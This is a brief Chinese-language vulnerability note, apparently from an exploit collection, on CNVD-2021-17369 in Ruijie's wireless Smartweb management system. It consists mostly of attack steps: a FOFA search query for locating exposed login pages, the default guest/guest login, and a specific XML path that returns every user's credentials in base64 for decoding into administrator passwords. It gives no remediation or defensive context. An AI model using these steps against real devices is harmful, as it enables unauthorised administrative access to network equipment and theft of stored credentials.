# 锐捷Smartweb管理系统 密码信息泄露 CNVD-2021-17369

锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。

FOFA:

`title="无线smartWeb--登录页面"`

默认guest账户密码：guest/guest


登录后访问：`http://target/web/xml/webuser-auth.xml`

获取所有用户账号密码，base64解码即可。

ref：

* https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ
* https://www.cnvd.org.cn/flaw/show/CNVD-2021-17369